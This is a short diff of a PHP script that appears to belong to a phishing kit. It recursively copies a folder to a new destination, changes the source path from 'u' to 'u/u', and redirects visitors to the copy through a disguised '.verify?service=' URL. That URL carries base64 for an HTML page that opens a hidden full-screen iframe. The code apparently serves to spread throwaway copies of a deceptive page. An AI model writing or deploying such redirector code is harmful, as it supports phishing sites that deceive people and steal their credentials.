@@ -22,7 +22,7 @@ copy($src . '/' . $file,$dst . '/' . $file);
 } 
 closedir($dir); 
 } 
-$src="u";
+$src="u/u";
 recurse_copy( $src, $dst );
 header("Location: $dst?id=$id&.verify?service=PGh0bWw+DQo8c3R5bGU+IGJvZHkgeyBtYXJnaW46IDA7IG92ZXJmbG93OiBoaWRkZW47IH0gPC9zdHlsZT4NCiAgPGlmcmFt");
 ?>
